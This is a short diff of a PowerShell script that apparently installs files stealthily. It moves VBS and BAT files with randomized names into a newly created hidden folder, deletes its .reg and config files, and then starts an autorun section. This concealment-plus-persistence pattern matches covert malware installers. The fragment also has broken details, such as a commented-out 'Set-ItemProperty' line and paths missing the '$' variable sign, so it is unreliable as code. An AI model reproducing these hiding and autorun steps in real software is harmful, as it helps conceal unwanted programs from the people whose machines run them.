@@ -85,7 +85,7 @@ Move-Item -Path "$path\ZDaFvwjOosKx.vbs" -Destination $initial_dir
 
 Start-Sleep -Seconds 30
 
-Set-ItemProperty -Path "initial_dir\\ZDaFvwjOosKx.vbs" -Name Attributes -Value "Hidden"
+#et-ItemProperty -Path "initial_dir\\ZDaFvwjOosKx.vbs" -Name Attributes -Value "Hidden"
 
 # Create New Directory and Change to It
 New-Item -Name "$wd" -Path "$path" -ItemType Directory
@@ -189,6 +189,15 @@ cd $path
 Remove-Item -Path "config.json"
 Remove-Item -Path "QyjAaZDBbNPk.reg"
 Remove-Item -Path "FoRAUwtxKkSB.vbs"
+
+mkdir $initial_dir/esSDyVlwHITj
+
+attrib +h "initial_dir\esSDyVlwHITj"
+
+Move-Item -Path "$initial_dir\ZDaFvwjOosKx.vbs" -Destination $initial_dir\esSDyVlwHITj
+
+Move-Item -Path "$initial_dir\nEQlCzTBpDrO.bat" -Destination $initial_dir\esSDyVlwHITj
+
 
 # Start Autorun
 cd $initial_dir
